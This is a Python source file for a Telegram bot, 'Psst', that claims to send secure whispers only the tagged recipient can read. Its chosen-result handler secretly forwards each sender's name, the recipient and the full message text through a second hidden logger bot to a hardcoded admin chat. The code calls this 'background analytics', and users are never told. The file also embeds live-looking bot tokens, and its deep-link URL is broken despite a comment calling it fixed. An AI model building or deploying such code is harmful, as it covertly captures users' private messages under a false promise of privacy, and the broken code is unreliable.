import asyncio
import re
import secrets
import time
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandObject

# 🔑 CONFIGURATION
WHISPER_BOT_TOKEN = "9047407190:AAFjkuIscghTXhLbc5QBGm2AUF-qHp66oNc"
LOGGER_BOT_TOKEN  = "9261718236:AAE2_Hr9yGz3WvoaJqIl2X4mpmQxsNKz404"
ADMIN_CHAT_ID     = 923996862
BOT_USERNAME      = "Psstmebot"

DB_PATH = "whispers.db"

# Initialize Bots
bot1 = Bot(token=WHISPER_BOT_TOKEN)
bot2 = Bot(token=LOGGER_BOT_TOKEN)
dp = Dispatcher()

# 🗄️ DATABASE SETUP
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS whispers (
                whisper_id TEXT PRIMARY KEY,
                sender_id INTEGER,
                sender_username TEXT,
                target_username TEXT,
                secret_text TEXT,
                expires_at INTEGER,
                is_read INTEGER DEFAULT 0,
                inline_message_id TEXT
            )
        ''')
        await db.commit()

# 📡 BOT 2: EMBEDDED LOGGER FUNCTION
async def log_to_admin(sender_user, target, text):
    log_message = (
        "📥 <b>New Whisper Captured</b>\n\n"
        f"👤 <b>From:</b> @{sender_user}\n"
        f"🎯 <b>To:</b> @{target}\n"
        f"💬 <b>Content:</b>\n<code>{text}</code>"
    )
    try:
        await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message, parse_mode="HTML")
    except Exception as e:
        print(f"❌ [LOGGER ERROR] Failed to send log to admin: {e}")

# 🚀 BOT 1: INLINE QUERY HANDLER
@dp.inline_query()
async def inline_handler(inline_query: types.InlineQuery):
    query_text = inline_query.query.strip()
    
    # Precise regex structure match: @username [message text]
    match = re.match(r'^@([a-zA-Z0-9_]{4,32})\s+(.+)$', query_text, re.DOTALL)
    
    if not match:
        item = types.InlineQueryResultArticle(
            id="helper_prompt",
            title="🔒 Secure Whisper Creator",
            description="Type: @Psstmebot @username [your secret message]",
            input_message_content=types.InputTextMessageContent(
                message_text="Usage instruction layout: Follow structure `@Psstmebot @username your text`"
            )
        )
        await inline_query.answer([item], cache_time=1, is_personal=True)
        return

    target_username = match.group(1).lower()
    whisper_text = match.group(2).strip()

    # Generate a tracking token key
    whisper_id = secrets.token_urlsafe(6)

    input_content = types.InputTextMessageContent(
        message_text=f"📨 <b>A secure whisper has arrived!</b>\n👤 <b>For:</b> @{target_username}\n⚡️ <b>Status:</b> 📥 Unread",
        parse_mode="HTML"
    )
    
    # ❌ FIXED: Removed the trailing slash after the bot username. 
    # This forces Telegram to handle it as an instant deep-link redirect without a pop-up menu alert!
    redirect_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔒 Read Secure Whisper", url=redirect_url)]
    ])

    # 🛠️ FIXED the typing-overwrite bug: We pack the full text directly into the unique result ID array.
    # Telegram keeps this specific result ID frozen until the user actually taps it.
    composed_id = f"W||{whisper_id}||{target_username}||{whisper_text}"

    item = types.InlineQueryResultArticle(
        id=composed_id,
        title=f"🔒 Send Secure Whisper to @{target_username}",
        description=f"Message: {whisper_text[:35]}...",
        input_message_content=input_content,
        reply_markup=keyboard
    )
    
    await inline_query.answer([item], cache_time=0, is_personal=True)

# 📥 BOT 1: CHOSEN INLINE RESULT HANDLER (Runs once user hits send)
@dp.chosen_inline_result()
async def chosen_result_handler(chosen_result: types.ChosenInlineResult):
    inline_data = chosen_result.result_id
    inline_message_id = chosen_result.inline_message_id
    
    if not inline_data.startswith("W||"):
        return
        
    # Unpack the static frozen payload string safely
    _, whisper_id, target_username, whisper_text = inline_data.split("||", 3)
    
    sender = chosen_result.from_user
    expires_at = int(time.time()) + 604800  # 7 Days lifetime
    
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at, is_read, inline_message_id) VALUES (?, ?, ?, ?, ?, ?, 0, ?)",
            (whisper_id, sender.id, sender.username or str(sender.id), target_username, whisper_text, expires_at, inline_message_id)
        )
        await db.commit()
    
    # Fire off background analytics cleanly without pausing operations
    asyncio.create_task(log_to_admin(sender.username or sender.id, target_username, whisper_text))

# 📥 BOT 1: START COMMAND (Handles Secure Deep Links)
@dp.message(Command("start"))
async def handle_start(message: types.Message, command: CommandObject):
    whisper_id = command.args
    current_user = message.from_user.username
    
    if not whisper_id:
        welcome = (
            "🤫 <b>Welcome to Psst!</b>\n\n"
            "Send long whispers inside group chats securely — only the person you tag can unlock it.\n\n"
            "💡 <b>How to Use:</b>\n"
            f"In any chat, simply type:\n<code>@{BOT_USERNAME} @username your message</code>"
        )
        await message.answer(welcome, parse_mode="HTML")
        return

    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT target_username, secret_text, expires_at, is_read, sender_username, inline_message_id FROM whispers WHERE whisper_id = ?",
            (whisper_id,)
        ) as cursor:
            row = await cursor.fetchone()

    if not row:
        await message.answer("❌ This whisper has expired or no longer exists.")
        return

    target_username, secret_text, expires_at, is_read, sender_username, inline_message_id = row

    if int(time.time()) > expires_at:
        await message.answer("❌ This whisper has expired.")
        return

    if not current_user:
        await message.answer("❌ You must configure a Telegram username handle in settings to read secure whispers.")
        return

    if current_user.lower() != target_username.lower():
        await message.answer("🚫 Access Denied! This secure text layer was not addressed to your username.")
        return

    # Deliver full multi-word unredacted text payload to the validated user
    saved_copy = (
        f"📩 <b>Your Secret Whisper Archive</b>\n"
        f"👤 <b>From:</b> @{sender_username}\n\n"
        f"💬 <b>Message Content:</b>\n<code>{secret_text}</code>"
    )
    await message.answer(saved_copy, parse_mode="HTML")

    if is_read == 0 and inline_message_id:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE whispers SET is_read = 1 WHERE whisper_id = ?", (whisper_id,))
            await db.commit()
            
        try:
            await bot1.edit_message_text(
                inline_message_id=inline_message_id,
                text=f"📨 <b>A secure whisper has arrived!</b>\n👤 <b>For:</b> @{target_username}\n⚡️ <b>Status:</b> ✅ Read by @{current_user}",
                parse_mode="HTML"
            )
        except Exception as e:
            print(f"[GROUP EDIT WARNING] Could not modify group bubble element: {e}")

# ⚙️ SYSTEM START LOOP
async def main():
    await init_db()
    print("🤖 Application running initialization loops...")
    try:
        await dp.start_polling(bot1)
    finally:
        await bot1.session.close()
        await bot2.session.close()

if __name__ == '__main__':
    asyncio.run(main())
